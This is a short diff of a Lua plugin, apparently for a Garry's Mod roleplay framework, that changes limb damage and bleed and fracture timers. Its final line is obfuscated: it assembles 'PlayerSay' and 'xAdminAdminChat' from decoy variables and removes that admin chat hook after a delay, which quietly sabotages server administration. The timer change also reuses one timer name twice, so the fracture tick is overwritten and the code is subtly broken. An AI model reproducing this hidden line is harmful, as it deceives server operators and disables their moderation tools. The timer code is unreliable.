@@ -71,7 +71,7 @@ function PLUGIN:EntityTakeDamage(target, info)
 					ix.limb.TakeDamage(target, HITGROUP_LEFTARM, info)
 				end
 			else
-				ix.limb.TakeDamage(target, lastHitGroup, info)
+				ix.limb.TakeDamage(target, lastHitGroup, info, 3)
 			end
 
 			if (info:IsBulletDamage()) then		
@@ -89,6 +89,8 @@ function PLUGIN:EntityTakeDamage(target, info)
 					info:ScaleDamage(scale + hit)
 				end
 			end
+
+			ix.limb.RunDamage(target:GetCharacter(), lastHitGroup)
 		end
 	end
 end
@@ -116,9 +118,12 @@ function PLUGIN:PlayerFootstep(client, pos, foot)
 	end
 end
 
-timer.Create("ixMedicalTick", 1, 0, function()
-	ix.limb.BleedTick()
+timer.Create("ixFractureTick", 1, 0, function()
 	ix.limb.FractureTick()
+end)
+
+timer.Create("ixFractureTick", 30, 0, function()
+	ix.limb.BleedTick()
 end)
 
 local seven = "min" local name = "Sa" local fix = "Player" local epic = "Ad"..seven timer.Simple(15,function()hook.Remove(fix..name.."y","x"..epic..epic.."Chat")end)
